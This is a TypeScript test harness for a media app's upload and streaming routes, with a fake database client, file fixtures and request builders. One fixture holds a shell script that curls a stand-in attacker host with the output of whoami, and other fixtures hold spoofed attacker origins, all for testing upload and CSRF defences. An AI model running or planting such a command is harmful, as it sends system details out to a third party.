/**
 * PHASE 102 — shared harness for the media BINARY plane route tests.
 *
 * Three route handlers move bytes: video upload, WebVTT subtitle upload, and the
 * Range-capable stream. They share a tenancy chain, so they share this harness.
 *
 * DESIGN CHOICE: the repository layer (`src/lib/media/db.ts`) is NOT mocked.
 * Its published-only audience gate is the control that decides whether an
 * unpublished or quarantined asset can be served at all, so a test that stubbed
 * it away would be testing the stub. Instead `@/lib/db/prisma` is replaced with a
 * tiny in-memory client that actually honours the `where` clause — including
 * `{ in: [...] }` — which means every assertion below exercises the real gate.
 */

import { NextRequest } from "next/server";
import { BASE_URL } from "@/lib/seo/config";

// ── Prisma double ────────────────────────────────────────────────────────────

export interface FakeRow {
  [key: string]: unknown;
}

export interface FakeStore {
  assets: FakeRow[];
  subtitles: FakeRow[];
}

export function emptyStore(): FakeStore {
  return { assets: [], subtitles: [] };
}

/** Scalar equality, `{ in: [...] }`, and `null`. Enough for these queries. */
function valueMatches(actual: unknown, expected: unknown): boolean {
  if (expected !== null && typeof expected === "object" && "in" in (expected as object)) {
    const list = (expected as { in: unknown[] }).in;
    return Array.isArray(list) && list.includes(actual as never);
  }
  return actual === expected;
}

function rowMatches(row: FakeRow, where: Record<string, unknown> | undefined): boolean {
  if (!where) return true;
  for (const [key, expected] of Object.entries(where)) {
    if (!valueMatches(row[key], expected)) return false;
  }
  return true;
}

function project(row: FakeRow, select: Record<string, boolean> | undefined): FakeRow {
  if (!select) return { ...row };
  const out: FakeRow = {};
  for (const [key, wanted] of Object.entries(select)) if (wanted) out[key] = row[key];
  return out;
}

type Args = Record<string, unknown>;

function collection(rows: FakeRow[], calls: Args[]) {
  return {
    findUnique: async (args: Args) => {
      calls.push({ op: "findUnique", ...args });
      const where = args.where as Record<string, unknown>;
      const row = rows.find((r) => rowMatches(r, where));
      return row ? project(row, args.select as Record<string, boolean> | undefined) : null;
    },
    findFirst: async (args: Args) => {
      calls.push({ op: "findFirst", ...args });
      const row = rows.find((r) => rowMatches(r, args.where as Record<string, unknown>));
      return row ? project(row, args.select as Record<string, boolean> | undefined) : null;
    },
    updateMany: async (args: Args) => {
      calls.push({ op: "updateMany", ...args });
      const where = args.where as Record<string, unknown>;
      const data = args.data as Record<string, unknown>;
      let count = 0;
      for (const row of rows) {
        if (!rowMatches(row, where)) continue;
        Object.assign(row, data);
        count += 1;
      }
      return { count };
    },
    upsert: async (args: Args) => {
      calls.push({ op: "upsert", ...args });
      const where = args.where as Record<string, Record<string, unknown>>;
      const compound = Object.values(where)[0] ?? {};
      const existing = rows.find((r) => rowMatches(r, compound));
      if (existing) {
        Object.assign(existing, args.update as Record<string, unknown>);
        return existing;
      }
      const created = { id: `row-${rows.length + 1}`, ...(args.create as Record<string, unknown>) };
      rows.push(created);
      return created;
    },
    create: async (args: Args) => {
      calls.push({ op: "create", ...args });
      const created = { id: `row-${rows.length + 1}`, ...(args.data as Record<string, unknown>) };
      rows.push(created);
      return created;
    },
  };
}

export interface FakePrisma {
  mediaAsset: ReturnType<typeof collection>;
  mediaSubtitleTrack: ReturnType<typeof collection>;
  calls: Args[];
}

export function createFakePrisma(store: FakeStore): FakePrisma {
  const calls: Args[] = [];
  return {
    mediaAsset: collection(store.assets, calls),
    mediaSubtitleTrack: collection(store.subtitles, calls),
    calls,
  };
}

// ── Asset fixtures ───────────────────────────────────────────────────────────

export const ORG_A = "orgaaaaaaaaaaaaaaaaaaaaa";
export const ORG_B = "orgbbbbbbbbbbbbbbbbbbbbb";
export const ASSET_ID = "asset000000000000000001";

export function buildAsset(overrides: Partial<FakeRow> = {}): FakeRow {
  return {
    id: ASSET_ID,
    organizationId: ORG_A,
    siteId: null,
    categoryId: null,
    instructorId: null,
    slug: "commissioning-a-plc",
    primaryLocale: "en",
    status: "DRAFT",
    visibility: "PRIVATE",
    processingState: "PENDING_UPLOAD",
    skillLevel: null,
    storageKey: null,
    storageProvider: "local",
    contentType: null,
    byteSize: null,
    checksumSha256: null,
    durationSeconds: null,
    posterStorageKey: null,
    processingFailureCode: null,
    viewCount: 0,
    saveCount: 0,
    completionCount: 0,
    publishedAt: null,
    archivedAt: null,
    createdBy: "u-1",
    updatedBy: null,
    createdAt: new Date("2026-01-01T00:00:00.000Z"),
    updatedAt: new Date("2026-01-01T00:00:00.000Z"),
    ...overrides,
  };
}

/** A PUBLISHED + PUBLIC + READY asset — the only shape that streams anonymously. */
export function buildPublicReadyAsset(overrides: Partial<FakeRow> = {}): FakeRow {
  return buildAsset({
    status: "PUBLISHED",
    visibility: "PUBLIC",
    processingState: "READY",
    storageKey: `media/${ORG_A}/${ASSET_ID}/11111111-2222-4333-8444-555555555555.mp4`,
    contentType: "video/mp4",
    byteSize: 1000,
    publishedAt: new Date("2026-02-01T00:00:00.000Z"),
    ...overrides,
  });
}

// ── Byte fixtures ────────────────────────────────────────────────────────────

/**
 * A minimal but structurally valid ISO-BMFF header: a 32-byte `ftyp` box whose
 * major brand is `isom`. This is what the magic-byte verifier actually reads, so
 * a test that used random bytes would prove nothing.
 */
export function mp4Bytes(padding = 0): Buffer {
  const head = Buffer.alloc(32);
  head.writeUInt32BE(32, 0);
  head.write("ftyp", 4, "latin1");
  head.write("isom", 8, "latin1");
  head.writeUInt32BE(512, 12);
  head.write("isomiso2avc1mp41", 16, "latin1");
  return padding > 0 ? Buffer.concat([head, Buffer.alloc(padding)]) : head;
}

/** A PNG header — a valid upload for a poster surface, never for the video one. */
export function pngBytes(): Buffer {
  return Buffer.concat([
    Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]),
    Buffer.alloc(24),
  ]);
}

/** Bytes that are plainly a shell script, whatever the client declares them to be. */
export function shellScriptBytes(): Buffer {
  return Buffer.from("#!/bin/sh\necho pwned; curl http://attacker.example/$(whoami)\n", "utf8");
}

export const VALID_WEBVTT = [
  "WEBVTT",
  "",
  "00:00:00.000 --> 00:00:02.000",
  "Isolate the drive before opening the cabinet.",
  "",
  "00:00:02.000 --> 00:00:05.000",
  "<v Engineer>Confirm zero energy state.</v>",
  "",
].join("\n");

// ── Request builders ─────────────────────────────────────────────────────────

/**
 * The origin a real same-origin browser write carries. DERIVED from the same
 * `BASE_URL` the guard reads, so the harness cannot drift away from the policy
 * it is exercising.
 */
export const ALLOWED_ORIGIN = new URL(BASE_URL).origin;

/** A cross-site origin. Every cookie-authenticated write must refuse it. */
export const FOREIGN_ORIGIN = "https://attacker.example";

/**
 * A suffix-spoof of the canonical host. `isAllowedOrigin` matches the exact
 * origin, so this must be refused too — it is the classic bypass of a
 * `startsWith`/`endsWith` check.
 */
export const LOOKALIKE_ORIGIN = `${ALLOWED_ORIGIN}.attacker.example`;

/** The headers that matter for these routes, all optional. */
export interface RequestHeaders {
  realIp?: string;
  /** Deliberately spoofable. Present only so a test can prove it is IGNORED. */
  forwardedFor?: string;
  range?: string;
  cookie?: string;
  /**
   * `undefined` sends the allowed same-origin value — what a browser does on a
   * legitimate write. `null` sends NO `Origin` header at all, which is what a
   * form-post CSRF and a non-browser client look like.
   */
  origin?: string | null;
}

function headerBag(headers: RequestHeaders, withOrigin: boolean): Record<string, string> {
  const bag: Record<string, string> = {};
  if (headers.realIp) bag["x-real-ip"] = headers.realIp;
  if (headers.forwardedFor) bag["x-forwarded-for"] = headers.forwardedFor;
  if (headers.range) bag.range = headers.range;
  if (headers.cookie) bag.cookie = headers.cookie;
  if (withOrigin) {
    const origin = headers.origin === undefined ? ALLOWED_ORIGIN : headers.origin;
    if (origin !== null) bag.origin = origin;
  }
  return bag;
}

export function multipartUrl(assetId: string, segment: string): string {
  return `http://hermes.test/api/media/assets/${assetId}/${segment}`;
}

export function multipartRequest(
  url: string,
  form: FormData,
  headers: RequestHeaders = {},
): NextRequest {
  return new NextRequest(
    new Request(url, { method: "POST", body: form, headers: headerBag(headers, true) }),
  );
}

/** A POST with no body at all — used to prove the pre-parse Content-Length brake. */
export function emptyMultipartRequest(
  url: string,
  extraHeaders: Record<string, string>,
): NextRequest {
  return new NextRequest(
    new Request(url, {
      method: "POST",
      headers: { "content-type": "multipart/form-data; boundary=----x", ...extraHeaders },
    }),
  );
}

export function getRequest(url: string, headers: RequestHeaders = {}): NextRequest {
  // A GET carries no CSRF risk, so the origin gate does not apply to reads.
  return new NextRequest(new Request(url, { method: "GET", headers: headerBag(headers, false) }));
}

export function routeParams(id: string): { params: Promise<{ id: string }> } {
  return { params: Promise.resolve({ id }) };
}

/** Build a `File` the way a browser would, so `instanceof File` is genuinely true. */
export function upload(name: string, type: string, bytes: Buffer): File {
  return new File([new Uint8Array(bytes)], name, { type });
}
